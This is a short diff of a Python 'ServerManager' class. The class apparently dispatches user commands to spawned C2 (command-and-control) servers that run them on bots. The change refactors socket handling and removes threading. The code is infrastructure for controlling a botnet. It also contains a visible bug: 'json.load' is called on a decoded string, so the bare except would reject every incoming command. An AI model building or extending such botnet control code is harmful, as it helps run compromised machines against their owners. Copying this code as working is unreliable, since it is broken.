@@ -48,23 +48,22 @@ class ServerManager():
             try:
                 command = command_socket.recv(1024)
                 command = json.load(command.decode())
-                command = Command(**command)
+                command = Command(command_socket, **command)
             except:
                 print("[-] Incoming command invalid")
                 break
 
             self.commands_in_process.append(command)
 
-            command_thread = threading.Thread(target=self.assign_command, args=(command_socket, command))
-            command_thread.start()
+            self.assign_command(command)
 
-    def assign_command(self, command_socket, command):
+    def assign_command(self, command):
         c2server = self.does_c2server_exist(command.user_id)
 
         if c2server is None:
             c2server = self.spawn_c2server()
 
-        command_socket.sendall(b'Command was properly processed')
+        command.command_socket.sendall(b'Command was processed, executing now.\n')
         try:
             c2server.execute_command(command)
         except NoBotsException:
